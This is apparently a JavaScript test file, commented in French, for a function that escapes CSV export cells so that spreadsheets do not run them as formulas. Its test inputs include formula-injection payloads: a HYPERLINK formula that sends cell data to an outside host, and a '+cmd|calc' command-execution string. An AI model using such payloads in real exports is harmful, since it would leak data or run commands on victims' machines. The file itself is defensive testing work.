// lib/celluleCSV.mjs (16/11) — sans base : une cellule d'export CSV ne doit
// jamais devenir une formule dans Excel (revue de sécurité 13/11, point 2),
// et une virgule / un guillemet / un saut de ligne ne décale pas les colonnes.
// node supabase/tests/test_cellule_csv.mjs
import { celluleCSV, contenuCSV } from '../../lib/celluleCSV.mjs'

let ok = 0, ko = 0
const check = (nom, recu, attendu) => { const b = recu === attendu; b ? ok++ : ko++; console.log((b ? 'PASS ' : 'FAIL ') + nom + (b ? '' : `  reçu ${JSON.stringify(recu)} attendu ${JSON.stringify(attendu)}`)) }

// les formules : apostrophe devant
check('=1+1', celluleCSV('=1+1'), `"'=1+1"`)
check('=HYPERLINK, guillemets doublés', celluleCSV('=HYPERLINK("http://x.io/?d="&B2,"Clic")'), `"'=HYPERLINK(""http://x.io/?d=""&B2,""Clic"")"`)
check('+ suivi de texte', celluleCSV('+cmd|calc'), `"'+cmd|calc"`)
check('- suivi de texte', celluleCSV('-2 pièces'), `"'-2 pièces"`)
check('@SUM', celluleCSV('@SUM(A1:A9)'), `"'@SUM(A1:A9)"`)
check('tabulation au début', celluleCSV('\t=1+1'), `"'\t=1+1"`)
check('retour chariot au début', celluleCSV('\r=1+1'), `"'\r=1+1"`)
check('-1+1 (calcul) neutralisé', celluleCSV('-1+1'), `"'-1+1"`)

// nombres et téléphones seuls : intacts
check('téléphone +244', celluleCSV('+244 923 456 789'), `"+244 923 456 789"`)
check('téléphone (+33) 6…', celluleCSV('+33 (0)6 12 34 56 78'), `"+33 (0)6 12 34 56 78"`)
check('-500', celluleCSV('-500'), `"-500"`)
check('mouvement +5', celluleCSV('+5'), `"+5"`)
check('nombre 12,5', celluleCSV(12.5), `"12.5"`)
check('zéro', celluleCSV(0), `"0"`)

// texte ordinaire
check('texte simple', celluleCSV('Luánda'), `"Luánda"`)
check('= au milieu : rien', celluleCSV('a=b'), `"a=b"`)
check('virgule', celluleCSV('MAN-1,2'), `"MAN-1,2"`)
check('guillemet', celluleCSV('Crème "XL"'), `"Crème ""XL"""`)
check('saut de ligne', celluleCSV('ligne 1\nligne 2'), `"ligne 1\nligne 2"`)
check('null', celluleCSV(null), `""`)
check('undefined', celluleCSV(undefined), `""`)

// contenu entier
check('deux lignes', contenuCSV([['Client', 'Tél'], ['=1+1', '+244 9']]), `"Client","Tél"\n"'=1+1","+244 9"`)
check('aucune ligne', contenuCSV([]), '')

console.log(`\n${ok} PASS, ${ko} FAIL`)
process.exit(ko ? 1 : 0)
